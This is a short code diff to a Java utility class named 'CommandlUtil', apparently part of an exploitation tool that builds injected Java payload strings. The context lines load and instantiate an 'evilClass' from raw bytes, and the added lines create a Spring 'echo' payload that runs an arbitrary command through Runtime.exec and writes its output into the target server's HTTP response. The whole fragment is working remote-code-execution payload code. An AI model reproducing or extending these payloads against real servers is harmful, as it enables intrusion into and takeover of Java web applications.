@@ -156,6 +156,9 @@ public class CommandlUtil {
                 "defineClassMethod.setAccessible(true);" +
                 "Class evilClass = (Class) defineClassMethod.invoke(java.lang.Thread.currentThread().getContextClassLoader(),new Object[]{classBytes,new Integer(0),new Integer(classBytes.length)});" +
                 "evilClass.newInstance();", parameter);
+        } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_SPRINGFRAMEWORK_ECHO)) {
+            String code = command.substring(CommandConstant.COMMAND_SPRINGFRAMEWORK_ECHO.length());
+            cmd = String.format("org.springframework.util.StreamUtils.copy(java.lang.Runtime.getRuntime().exec(\"%s\").getInputStream(),((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes()).getResponse().getOutputStream());",code);
         } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_UNSAFE_DEFINEANONYMOUSCLASS)) {
             String code = "";
             String parameter = command.substring(CommandConstant.COMMAND_UNSAFE_DEFINEANONYMOUSCLASS.length());
